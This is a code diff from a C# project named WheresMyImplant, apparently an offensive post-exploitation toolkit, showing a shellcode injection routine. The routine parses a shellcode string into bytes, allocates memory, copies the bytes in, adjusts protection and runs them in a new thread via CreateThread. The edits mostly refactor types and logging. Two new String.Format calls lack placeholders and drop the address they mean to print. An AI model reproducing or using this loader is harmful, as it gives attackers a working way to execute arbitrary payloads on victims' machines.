@@ -14,22 +14,22 @@ namespace WheresMyImplant
             string[] shellCodeArray = shellCodeString.Split(DELIMITER);
             byte[] shellCodeBytes = new Byte[shellCodeArray.Length];
 
-            for (int i = 0; i < shellCodeArray.Length; i++)
+            for (Int32 i = 0; i < shellCodeArray.Length; i++)
             {
-                int value = (int)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
+                Int32 value = (Int32)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
                 shellCodeBytes[i] = Convert.ToByte(value);
             }
 
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpAddress = IntPtr.Zero;
             UInt32 dwSize = (UInt32)shellCodeBytes.Length;
-            IntPtr lpBaseAddress = Unmanaged.VirtualAlloc(lpAddress, dwSize, Unmanaged.MEM_COMMIT, Winnt.PAGE_READWRITE);
-            WriteOutput("Allocating Space at Address " + lpBaseAddress);
+            IntPtr lpBaseAddress = kernel32.VirtualAlloc(lpAddress, dwSize, Unmanaged.MEM_COMMIT, Winnt.PAGE_READWRITE);
+            WriteOutput(String.Format("Allocating Space at Address {0}", lpBaseAddress.ToString("X4")));
             WriteOutput("Memory Protection Set to PAGE_READWRITE");
 
             ////////////////////////////////////////////////////////////////////////////////
             Marshal.Copy(shellCodeBytes, 0, lpBaseAddress, shellCodeBytes.Length);
-            WriteOutput("Injected ShellCode at address " + lpBaseAddress);
+            WriteOutput(String.Format("Injected ShellCode at address ", lpBaseAddress.ToString("X4")));
 
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 lpflOldProtect = 0;
@@ -44,7 +44,7 @@ namespace WheresMyImplant
             UInt32 threadId = 0;
             WriteOutput("Attempting to start thread");
             IntPtr hThread = Unmanaged.CreateThread(lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
-            WriteOutput("Started Thread: " + hThread);
+            WriteOutput(String.Format("Started Thread: ", hThread.ToString("X4")));
 
             ////////////////////////////////////////////////////////////////////////////////
             Unmanaged.WaitForSingleObject(hThread, 0xFFFFFFFF);
